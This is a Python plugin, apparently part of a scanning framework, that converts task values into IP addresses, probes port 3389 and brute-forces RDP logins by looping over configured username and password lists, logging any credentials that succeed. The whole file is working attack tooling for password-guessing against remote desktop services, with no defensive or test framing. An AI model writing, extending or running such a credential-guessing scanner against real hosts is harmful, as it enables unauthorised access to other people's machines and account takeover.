from task import *
import rdp
import socket
import time

'''
#define RDP_RESULT_CONN_ERROR           -1
#define RDP_RESULT_CONN_FAIL            0
#define RDP_RESULT_TIMEOUT              1
#define RDP_RESULT_PASS_FAIL            2
#define RDP_RESULT_SUCESS               3
#define RDP_RESULT_SUCESS_LOGON         4
'''

class port_plugin(engine_plugin):
    def __init__(self, name):
        engine_plugin.__init__(self, name)
        
        rdp.SETTINGS["login_timeout"] = 4000
        
    def handle_task(self, task_info):
        ip =  socket.inet_ntoa(struct.pack("I", socket.htonl(task_info['work'])))
        self.log(task_info, "handle_task: %s process:%d" %  (ip, task_info['process']))
        
        try:
            sock = socket.create_connection((ip, 3389), 1)
            sock.close()
        except:
            return

        self.log(task_info, "test: %s " % ip)
        
        for user in self.get_cfg_vaule(task_info, "users").split("\n"):
            for pwd in self.get_cfg_vaule(task_info, "passes").split("\n"):
                try:
                    ret = rdp.connect(ip, user, pwd)
                    self.log(task_info, "test: %s %s %s %d" % (ip, user, pwd, ret))
                    if (ret >= rdp.RESULT_SUCESS):
                        self.log(task_info, "%s\t%s\t%s OK!!!!" % (ip, user, pwd))
                        return
                except:
                    self.log(task_info, "test: %s %s %s except" % (ip, user, pwd))
                    pass
        
        self.log(task_info, "test: %s done" % ip)
        
def init_plugin(name):
    return port_plugin(name)
    